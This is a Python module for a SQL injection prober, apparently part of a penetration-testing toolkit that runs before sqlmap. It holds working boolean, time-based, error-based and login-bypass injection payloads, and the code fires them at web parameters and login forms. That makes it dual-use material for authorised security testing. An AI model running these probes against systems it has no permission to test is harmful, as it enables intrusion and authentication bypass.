"""
Pre-scan SQLi prober - Quick detection before running sqlmap.
Tests basic boolean-based and time-based blind injection.
"""

import time
import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from rich.console import Console

console = Console()

# Boolean-based test pairs: (true_payload, false_payload)
BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("' OR 1=1#", "' OR 1=2#"),
    ('" OR "1"="1', '" OR "1"="2'),
    ("1 OR 1=1", "1 OR 1=2"),
    ("') OR ('1'='1", "') OR ('1'='2"),
    ("1) OR (1=1", "1) OR (1=2"),
]

# Time-based payloads per DBMS
TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", "MySQL"),
    ("' AND SLEEP(3)#", "MySQL"),
    ("'; SELECT pg_sleep(3)--", "PostgreSQL"),
    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL"),
    ("' AND 1=randomblob(300000000)--", "SQLite"),
]

# Auth bypass payloads
AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1--",
    "\" OR \"\"=\"",
    "' OR ''='",
]

# Error patterns indicating SQL error disclosure
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "microsoft ole db provider for odbc drivers",
    "microsoft sql native client error",
    "ora-01756",
    "ora-00933",
    "pg_query()",
    "pg_exec()",
    "syntax error at or near",
    "unterminated string",
    "sql syntax.*mysql",
    "valid mysql result",
    "postgresql.*error",
    "warning.*pg_",
    "sqlite3.operationalerror",
    "sqlexception",
    "system.data.sqlclient",
    "jdbc.sqlerror",
    "hibernate",
    "[sqlserver]",
    "[microsoft][odbc sql server driver]",
    "com.mysql.jdbc",
    "sqlstate",
]


class ProbeResult:
    def __init__(self, url, param, method="GET"):
        self.url = url
        self.param = param
        self.method = method
        self.boolean_vulnerable = False
        self.time_vulnerable = False
        self.error_vulnerable = False
        self.auth_bypass = False
        self.dbms = None
        self.details = []


class SQLiProber:
    def __init__(self, session=None, timeout=10, verify_ssl=False):
        self.session = session or requests.Session()
        self.timeout = timeout
        self.verify_ssl = verify_ssl

    def _send(self, url, method, param_name, payload, data=None):
        """Send a request with the payload injected into the target parameter."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            if method == "GET":
                params[param_name] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment,
                ))
                start = time.time()
                resp = self.session.get(new_url, verify=self.verify_ssl, timeout=self.timeout, allow_redirects=True)
                elapsed = time.time() - start
            else:
                post_data = dict(data) if data else {}
                post_data[param_name] = payload
                start = time.time()
                resp = self.session.post(url, data=post_data, verify=self.verify_ssl, timeout=self.timeout, allow_redirects=True)
                elapsed = time.time() - start

            return resp, elapsed
        except requests.Timeout:
            return None, self.timeout
        except requests.RequestException:
            return None, 0

    def _check_sql_errors(self, text):
        """Check response body for SQL error messages."""
        text_lower = text.lower()
        for pattern in SQL_ERROR_PATTERNS:
            if pattern in text_lower:
                return pattern
        return None

    def probe_boolean(self, url, param_name, method="GET", data=None):
        """Test for boolean-based blind SQLi."""
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            resp_true, _ = self._send(url, method, param_name, true_payload, data)
            resp_false, _ = self._send(url, method, param_name, false_payload, data)

            if resp_true and resp_false:
                # Significant difference in response length
                len_diff = abs(len(resp_true.text) - len(resp_false.text))
                if len_diff > 50:
                    return True, f"Boolean: diff={len_diff} bytes ({true_payload})"

                # Different status codes
                if resp_true.status_code != resp_false.status_code:
                    return True, f"Boolean: status {resp_true.status_code} vs {resp_false.status_code}"

                # Different redirect targets — on compare uniquement netloc+path (SANS
                # la query) : WordPress/SecuPress redirigent vers le login en reflétant
                # le payload dans ?redirect_to=..., ce qui ferait un FAUX POSITIF si on
                # comparait l'URL complète (les 2 payloads diffèrent forcément).
                t, f = urlparse(resp_true.url), urlparse(resp_false.url)
                if (t.netloc, t.path) != (f.netloc, f.path):
                    return True, f"Boolean: redirect path {t.path or '/'} vs {f.path or '/'}"

        return False, None

    def probe_time(self, url, param_name, method="GET", data=None):
        """Test for time-based blind SQLi."""
        # Get baseline response time
        _, baseline = self._send(url, method, param_name, "1", data)

        for payload, dbms in TIME_PAYLOADS:
            _, elapsed = self._send(url, method, param_name, payload, data)

            if elapsed >= 2.5 and elapsed > baseline + 2:
                # Confirm with a second attempt
                _, elapsed2 = self._send(url, method, param_name, payload, data)
                if elapsed2 >= 2.5 and elapsed2 > baseline + 2:
                    return True, dbms, f"Time-based: {elapsed:.1f}s (baseline: {baseline:.1f}s) -> {dbms}"

        return False, None, None

    def probe_error(self, url, param_name, method="GET", data=None):
        """Test for error-based SQLi by injecting a single quote."""
        error_payloads = ["'", '"', "')", "';", "\\"]
        for payload in error_payloads:
            resp, _ = self._send(url, method, param_name, payload, data)
            if resp:
                error = self._check_sql_errors(resp.text)
                if error:
                    return True, f"Error-based: pattern='{error}' avec payload '{payload}'"
        return False, None

    def probe_auth_bypass(self, form, session=None):
        """Test login form for authentication bypass."""
        s = session or self.session

        # Find username and password fields
        username_field = None
        password_field = None
        other_fields = {}

        for inp in form.inputs:
            name = inp.get("name", "")
            if not name:
                continue
            name_lower = name.lower()
            if name_lower in {"username", "user", "uname", "login", "email", "user_name", "usr", "account"}:
                username_field = name
            elif name_lower in {"password", "passwd", "pass", "pwd"} or inp.get("type") == "password":
                password_field = name
            else:
                other_fields[name] = inp.get("value", "")

        if not username_field:
            return False, None

        # Get baseline (failed login)
        base_data = dict(other_fields)
        base_data[username_field] = "definitely_not_a_user_12345"
        if password_field:
            base_data[password_field] = "wrong_password_12345"

        try:
            base_resp = s.post(form.full_action, data=base_data, verify=self.verify_ssl, timeout=self.timeout, allow_redirects=True)
        except requests.RequestException:
            return False, None

        # Test each bypass payload
        for payload in AUTH_BYPASS_PAYLOADS:
            test_data = dict(other_fields)
            test_data[username_field] = payload
            if password_field:
                test_data[password_field] = "anything"

            try:
                test_resp = s.post(form.full_action, data=test_data, verify=self.verify_ssl, timeout=self.timeout, allow_redirects=True)
            except requests.RequestException:
                continue

            # Check for bypass indicators
            len_diff = abs(len(test_resp.text) - len(base_resp.text))
            if len_diff > 100:
                return True, f"Auth bypass possible: '{payload}' (diff={len_diff} bytes)"

            if test_resp.status_code != base_resp.status_code:
                return True, f"Auth bypass possible: '{payload}' (status {test_resp.status_code} vs {base_resp.status_code})"

            if test_resp.url != base_resp.url:
                return True, f"Auth bypass possible: '{payload}' (redirect: {test_resp.url})"

            # New cookies issued (session created)
            new_cookies = set(test_resp.cookies.keys()) - set(base_resp.cookies.keys())
            if new_cookies:
                return True, f"Auth bypass possible: '{payload}' (new cookies: {new_cookies})"

        return False, None

    def probe_injection_point(self, ip):
        """Full probe of a single injection point."""
        result = ProbeResult(ip.url, ip.param_name, ip.method)

        if ip.method in ("HEADER", "COOKIE"):
            return result

        console.print(f"    [dim]Probe {ip.method} {ip.param_name} @ {ip.url[:60]}[/dim]")

        # Error-based (fastest)
        vuln, detail = self.probe_error(ip.url, ip.param_name, ip.method)
        if vuln:
            result.error_vulnerable = True
            result.details.append(detail)
            console.print(f"    [bold red]ERROR SQLi: {detail}[/bold red]")

        # Boolean-based
        vuln, detail = self.probe_boolean(ip.url, ip.param_name, ip.method)
        if vuln:
            result.boolean_vulnerable = True
            result.details.append(detail)
            console.print(f"    [bold red]BOOLEAN SQLi: {detail}[/bold red]")

        # Time-based (slowest, only if nothing found yet)
        if not result.error_vulnerable and not result.boolean_vulnerable:
            vuln, dbms, detail = self.probe_time(ip.url, ip.param_name, ip.method)
            if vuln:
                result.time_vulnerable = True
                result.dbms = dbms
                result.details.append(detail)
                console.print(f"    [bold red]TIME SQLi: {detail}[/bold red]")

        return result
